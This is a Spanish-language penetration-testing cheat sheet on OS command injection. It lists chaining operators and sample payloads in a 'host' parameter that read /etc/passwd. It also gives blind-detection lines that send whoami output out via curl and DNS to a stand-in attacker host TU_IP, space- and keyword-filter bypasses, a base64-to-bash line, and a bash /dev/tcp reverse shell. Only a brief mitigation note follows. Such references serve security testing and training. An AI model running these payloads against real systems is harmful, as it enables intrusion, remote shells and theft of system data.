# Command Injection

La entrada llega a una llamada del sistema (`system`, `exec`, `popen`,
`subprocess`, backticks). Frecuente en funciones de "ping", "monitor",
"convert", "backup", generadores (VPN, PDF, imágenes).

## Operadores de encadenado

```
; id                 ejecuta después
&& id                si el anterior tuvo éxito
|| id                si el anterior falló
| id                 pipe
`id`                 sustitución (backticks)
$(id)                sustitución
%0a id               newline (a veces en web)
```

Ejemplos en un parámetro `host`:

```
127.0.0.1; id
127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
```

## Blind (sin salida visible)

Confirma por **tiempo** o **callback**:

```bash
127.0.0.1; sleep 5                         # time-based
127.0.0.1; ping -c 3 TU_IP                 # oob por ICMP (tcpdump)
127.0.0.1; curl http://TU_IP/$(whoami)     # oob por HTTP
127.0.0.1; nslookup `whoami`.TU_DOMINIO    # oob por DNS
```

```bash
sudo tcpdump -i tun0 icmp          # escucha pings
python3 -m http.server 80          # escucha curl
```

## Bypass de filtros

```
# Espacios bloqueados
cat</etc/passwd
{cat,/etc/passwd}
cat$IFS/etc/passwd

# Palabras bloqueadas (insertar vacío)
c""at /etc/pa''sswd
c\at /etc/passwd
w'h'o'am'i

# Codificación
echo aWQ= | base64 -d | bash
```

## De cmd injection a shell

Lanza reverse shell directo (ver [12-shells-pivoting.md](12-shells-pivoting.md)):

```bash
127.0.0.1; bash -c 'bash -i >& /dev/tcp/TU_IP/PORT 0>&1'
```

## Mitigación

Evitar shell: usar APIs que reciben argumentos como lista (`subprocess.run([...],
shell=False)`), allowlist estricta de entrada, escapar/validar, no construir
comandos por concatenación.
